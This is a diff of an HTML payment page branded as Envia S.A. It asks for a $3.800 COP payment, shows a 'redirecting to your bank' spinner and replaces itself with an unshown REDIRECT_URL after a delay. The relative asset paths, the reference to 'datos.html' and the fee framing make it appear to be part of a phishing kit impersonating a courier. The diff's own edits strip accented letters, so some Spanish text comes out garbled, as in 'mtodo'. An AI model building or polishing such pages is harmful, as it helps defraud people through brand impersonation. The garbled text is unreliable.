@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Elige un método de pago</title>
+  <title>Elige un mtodo de pago</title>
   <style>
     *,*::before,*::after{box-sizing:border-box}
     body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,'Helvetica Neue',Arial,sans-serif;background:#f5f7f9;color:#1f2937}
@@ -20,7 +20,7 @@
     .amount{color:var(--brand);font-size:1.9rem;font-weight:800;margin:6px 0 16px}
     .amount small{font-weight:600;font-size:.9rem;color:#374151;margin-left:6px}
 
-    /* Métodos */
+    /* Mtodos */
     .methods{display:grid;gap:10px;padding:12px}
     .method{display:flex;gap:14px;align-items:center;padding:14px;border:1px solid var(--border);border-radius:12px;background:var(--tile);text-decoration:none;color:inherit;transition:background .15s,border-color .15s,transform .06s}
     .method:hover{background:var(--tile-hover);border-color:#d1d5db}
@@ -44,7 +44,7 @@
     .loading p{margin:0;color:#6b7280;font-size:.95rem}
     @keyframes spin{to{transform:rotate(360deg)}}
 
-    /* Animación sutil */
+    /* Animacin sutil */
     @keyframes fadeSlide{from{opacity:0;transform:translateX(10px)} to{opacity:1;transform:translateX(0)}}
     .animate-in{animation:fadeSlide .35s ease-out both}
 
@@ -55,7 +55,7 @@
   <main class="page">
     <section class="card">
       <header class="header">
-        <div class="brand"><img src="../../Ass/header_logo.png" alt="Envia S.A" /></div>
+        <div class="brand"><img src="../../Ass/header_logo.webp" alt="Envia S.A" /></div>
         <h2 class="subtitle">Pago a</h2>
         <p class="merchant">Envia S.A</p>
         <p class="amount">$3.800 <small>COP</small></p>
@@ -63,7 +63,7 @@
 
       <div id="loading" class="loading animate-in" aria-live="polite">
         <div class="spinner" role="status" aria-label="Cargando"></div>
-        <p>Redirigiendo a su banco…</p>
+        <p>Redirigiendo a su banco</p>
       </div>
 
       <!-- Footers como en datos.html -->
@@ -78,7 +78,7 @@
 
   document.addEventListener('DOMContentLoaded', () => {
     setTimeout(() => {
-      // Cambia la página actual por el archivo
+      // Cambia la pgina actual por el archivo
       window.location.replace(REDIRECT_URL);
     }, REDIRECT_DELAY_MS);
   });
